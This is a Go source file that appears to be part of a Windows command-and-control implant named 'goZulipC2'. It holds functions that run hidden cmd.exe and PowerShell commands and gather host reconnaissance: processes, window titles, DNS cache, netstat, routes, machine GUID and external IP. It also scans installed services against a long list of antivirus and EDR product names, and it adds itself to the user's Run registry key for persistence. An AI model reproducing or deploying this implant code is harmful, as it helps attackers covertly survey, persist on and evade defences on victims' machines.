package main

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"github.com/olekukonko/tablewriter"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows/registry"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

const (
	regKey   = `SOFTWARE\Microsoft\Cryptography`
	regValue = "MachineGuid"
)

type ProcessInfo struct {
	PID        int32
	Name       string
	MemoryPerc float32
}

type diskUsage struct {
	Total    uint64
	Free     uint64
	Used     uint64
	Capacity float64
}

type WindowInfo struct {
	Handle syscall.Handle
	Title  string
}

func CommandExec(command ...string) string {
	cmd := exec.Command("cmd.exe", "/c", strings.Join(command, " "))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	_ = cmd.Start()
	_ = cmd.Wait()
	output := strings.TrimSpace(stdout.String() + "\n" + stderr.String())
	return fmt.Sprintf("%s\n", output)
}

func PowershellExec(command ...string) string {
	cmd := exec.Command("powershell.exe", command...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Start()
	err = cmd.Wait()
	output := strings.TrimSpace(stdout.String() + "\n" + stderr.String())
	if err != nil {
		return fmt.Sprintf("PowerShell command failed with error: %s\n%s\n", err, output)
	}
	return fmt.Sprintf("%s\n", output)
}

func GetMachineID() (string, error) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, regKey, registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()

	guid, _, err := k.GetStringValue(regValue)
	if err != nil {
		return "", err
	}

	return guid, nil
}

func GetProcessInfo() []ProcessInfo {
	processes, err := process.Processes()
	if err != nil {
		panic(err)
	}

	var processInfo []ProcessInfo
	for _, p := range processes {
		name, _ := p.Name()
		memPercent, _ := p.MemoryPercent()
		processInfo = append(processInfo, ProcessInfo{
			PID:        p.Pid,
			Name:       name,
			MemoryPerc: memPercent,
		})
	}
	return processInfo
}

func GetProcessTable() string {
	var buf bytes.Buffer
	table := tablewriter.NewWriter(&buf)
	processInfo := GetProcessInfo()

	// Todo: make it more descriptive
	table.SetHeader([]string{"PID", "Name", "Memory %"})
	for _, p := range processInfo {
		table.Append([]string{strconv.Itoa(int(p.PID)), p.Name, fmt.Sprintf("%.2f", p.MemoryPerc)})
	}
	table.Render()
	return buf.String()
}

func checkDrivers() []string {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services`, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return []string{fmt.Sprintf("Error: %v", err)}
	}
	defer k.Close()

	names, err := k.ReadSubKeyNames(-1)
	if err != nil {
		return []string{fmt.Sprintf("Error: %v", err)}
	}

	// credits: https://github.com/ZephrFish/edr-checker/blob/master/Invoke-EDRChecker.ps1
	var edrDrivers = []string{"activeconsole",
		"amsi.dll",
		"authtap",
		"avast",
		"avecto",
		"canary",
		"carbon",
		"cb.exe",
		"ciscoamp",
		"cisco amp",
		"countertack",
		"cramtray",
		"crssvc",
		"crowdstrike",
		"csagent",
		"csfalcon",
		"csshell",
		"cybereason",
		"cyclorama",
		"cylance",
		"cyoptics",
		"cyupdate",
		"cyvera",
		"cyserver",
		"cytray",
		"defendpoint",
		"defender",
		"eectrl",
		"emcoreservice",
		"emsystem",
		"endgame",
		"fireeye",
		"forescout",
		"fortiedr",
		"groundling",
		"GRRservice",
		"inspector",
		"ivanti",
		"kaspersky",
		"lacuna",
		"logrhythm",
		"logcollector",
		"malware",
		"mandiant",
		"mcafee",
		"monitoringhost",
		"morphisec",
		"mpcmdrun",
		"msascuil",
		"msmpeng",
		"mssense",
		"msmpeng",
		"nissrv",
		"ntrtscan",
		"osquery",
		"Palo Alto Networks",
		"pgeposervice",
		"pgsystemtray",
		"privilegeguard",
		"procwall",
		"protectorservice",
		"qradar",
		"redcloak",
		"secureconnector",
		"secureworks",
		"securityhealthservice",
		"semlaunchsvc",
		"senseir",
		"sense",
		"sentinel",
		"sepliveupdate",
		"sisidsservice",
		"sisipsservice",
		"sisipsutil",
		"smc.exe",
		"smcgui",
		"snac64",
		"sophos",
		"splunk",
		"srtsp",
		"symantec",
		"symcorpui",
		"symefasi",
		"sysinternal",
		"sysmon",
		"tanium",
		"tda.exe",
		"tdawork",
		"tmlisten",
		"tmbmsrv",
		"tmssclient",
		"tmccsf",
		"tpython",
		"trend",
		"watchdogagent",
		"wincollect",
		"windowssensor",
		"wireshark",
		"xagt"}

	var matches []string

	for _, name := range names {
		for _, edrDriver := range edrDrivers {
			if strings.Contains(strings.ToLower(name), strings.ToLower(edrDriver)) {
				matches = append(matches, name)
			}
		}
	}

	return matches
}

func getIPConfig() []string {
	cmd := exec.Command("ipconfig")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}
	stdout, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	info := strings.Split(string(stdout), "\n")
	return info
}

func getDNSEntries() []string {
	cmd := exec.Command("ipconfig", "/displaydns")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}
	stdout, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	info := strings.Split(string(stdout), "\n")
	return info
}

func getLocaleInfo() string {
	mod := syscall.NewLazyDLL("kernel32.dll")
	getSystemDefaultLocaleName := mod.NewProc("GetSystemDefaultLocaleName")

	buffer := make([]uint16, 85) // Define a buffer to store the locale name

	_, _, _ = getSystemDefaultLocaleName.Call(
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)))

	return syscall.UTF16ToString(buffer)
}

func getNetStat() []string {
	// Lets the NetStat to Scan for 10 seconds, cancels and gets the output. You may increase the timer for longer outputs.
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "netstat")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}

	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println(err)
		return nil
	}

	var wg sync.WaitGroup
	var info []string
	infoChannel := make(chan string)

	wg.Add(1)
	go func() {
		defer wg.Done()

		scanner := bufio.NewScanner(stdoutPipe)
		for scanner.Scan() {
			infoChannel <- scanner.Text()
		}
	}()

	go func() {
		cmd.Run()
		close(infoChannel)
	}()

	go func() {
		<-ctx.Done()
		cmd.Process.Kill()
	}()

	for line := range infoChannel {
		info = append(info, line)
	}

	wg.Wait()

	return info
}

func getDiskUsage() ([]string, []diskUsage) {
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		fmt.Println(err)
		return nil, nil
	}
	defer syscall.FreeLibrary(kernel32)

	getDiskFreeSpaceEx, err := syscall.GetProcAddress(kernel32, "GetDiskFreeSpaceExW")
	if err != nil {
		fmt.Println(err)
		return nil, nil
	}

	var drives [26]rune
	for i := 0; i < len(drives); i++ {
		drives[i] = rune('A' + i)
	}

	var drivesWithInfo []string
	var drivesUsage []diskUsage

	for _, drive := range drives {
		rootPath := fmt.Sprintf("%c:", drive)
		pathPtr, _ := syscall.UTF16PtrFromString(rootPath)

		var freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes int64
		_, _, callErr := syscall.Syscall6(
			getDiskFreeSpaceEx,
			4,
			uintptr(unsafe.Pointer(pathPtr)),
			uintptr(unsafe.Pointer(&freeBytesAvailable)),
			uintptr(unsafe.Pointer(&totalNumberOfBytes)),
			uintptr(unsafe.Pointer(&totalNumberOfFreeBytes)),
			0,
			0,
		)
		if callErr != 0 {
			continue
		}

		driveCapacity := float64(totalNumberOfBytes)
		driveUsage := float64(totalNumberOfBytes - totalNumberOfFreeBytes)
		driveFree := float64(freeBytesAvailable)

		driveInfo := diskUsage{
			Total:    uint64(driveCapacity),
			Free:     uint64(driveFree),
			Used:     uint64(driveUsage),
			Capacity: (driveUsage / driveCapacity) * 100,
		}

		driveName := strings.TrimSuffix(rootPath, ":")

		drivesWithInfo = append(drivesWithInfo, driveName)
		drivesUsage = append(drivesUsage, driveInfo)
	}

	return drivesWithInfo, drivesUsage
}

func getMemoryInfo() uint64 {
	var memoryInfo [64]byte
	memoryInfo[0] = 64

	ret, _, _ := globalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memoryInfo[0])))
	if ret == 0 {
		fmt.Println("Error retrieving memory info")
		return 0
	}

	totalPhysicalMemory := *(*uint64)(unsafe.Pointer(&memoryInfo[8]))

	return totalPhysicalMemory
}

func getRoutePrint() []string {
	cmd := exec.Command("cmd", "/C", "route", "print")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP}

	output, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
		return nil
	}

	info := strings.Split(string(output), "\n")
	return info
}

func GetTickCount64() uint64 {
	ret, _, _ := procGetTickCount64.Call()
	return uint64(ret)
}

func EnumWindowsProc(hwnd syscall.Handle, lParam uintptr) uintptr {
	isVisible, _, _ := isWindowVisible.Call(uintptr(hwnd))
	if isVisible == 0 {
		return 1
	}

	textLen, _, _ := getWindowTextLen.Call(uintptr(hwnd))
	if textLen == 0 {
		return 1
	}

	buf := make([]uint16, textLen+1)
	_, _, _ = getWindowTextW.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&buf[0])), textLen+1)

	windows := (*[]WindowInfo)(unsafe.Pointer(lParam))
	*windows = append(*windows, WindowInfo{Handle: hwnd, Title: syscall.UTF16ToString(buf)})
	return 1
}

func GetVisibleWindows() []WindowInfo {
	var windows []WindowInfo
	_, _, _ = enumWindows.Call(syscall.NewCallback(EnumWindowsProc), uintptr(unsafe.Pointer(&windows)))
	return windows
}

func Persistence() {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	defer k.Close()

	if err == nil {
		_, _, err := k.GetStringValue("goZulipC2")
		if err != nil {
			exePath, _ := os.Executable()
			_ = k.SetStringValue("goZulipC2", exePath)
		}
	} else {
		_ = k.DeleteValue("goZulipC2")
	}

	return
}

func DeletePersistence() {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	defer k.Close()

	if err == nil {
		_ = k.DeleteValue("goZulipC2")
	}

	return
}

func getDesktopUsername() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", err
	}

	username := currentUser.Username
	desktopName := ""

	if osType := os.Getenv("OS"); osType[:7] == "Windows" {
		// For Windows, extract the desktop name if available
		if parts := strings.Split(username, "\\"); len(parts) == 2 {
			desktopName = parts[0]
			username = parts[1]
		}
	}

	return fmt.Sprintf("%s\\%s", desktopName, username), nil
}

func getProgramArchitecture() string {
	architecture := runtime.GOARCH
	if strings.HasPrefix(architecture, "amd64") {
		return "x64"
	} else if strings.HasPrefix(architecture, "386") {
		return "x32"
	}
	return architecture
}

func getExternalIP() (string, error) {
	resp, err := http.Get("https://myexternalip.com/raw")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ipAddress, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(ipAddress), nil
}
